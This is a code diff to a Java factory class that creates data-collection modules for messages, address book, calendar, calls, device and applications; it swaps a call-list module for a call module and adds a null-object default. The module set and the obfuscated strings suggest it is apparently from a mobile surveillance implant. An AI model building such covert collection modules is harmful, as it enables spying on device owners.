@@ -26,7 +26,7 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 	 * @return the requested agent or null in case of error
 	 */
 	public BaseModule create(String type, String subtype) {
-		BaseModule a = null;
+		BaseModule a = new NullModule();
 
 		if (Messages.getString("c.0").equals(type)) { //$NON-NLS-1$
 			a = new ModuleMessage();
@@ -34,8 +34,6 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 			a = new ModuleAddressBook();
 		} else if (Messages.getString("c.2").equals(type)) { //$NON-NLS-1$
 			a = new ModuleCalendar();
-		} else if (Messages.getString("c.3").equals(type)) { //$NON-NLS-1$
-			a = new ModuleCallList();
 		} else if (Messages.getString("c.4").equals(type)) { //$NON-NLS-1$
 			a = new ModuleDevice();
 		} else if (Messages.getString("c.5").equals(type)) { //$NON-NLS-1$
@@ -54,6 +52,8 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 			a = new ModuleCrisis();
 		} else if (Messages.getString("c.12").equals(type)) { //$NON-NLS-1$
 			a = new ModuleApplication();
+		} else if (Messages.getString("c.13").equals(type)) { //$NON-NLS-1$
+			a = new ModuleCall();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
@@ -62,5 +62,4 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 
 		return a;
 	}
-
 }
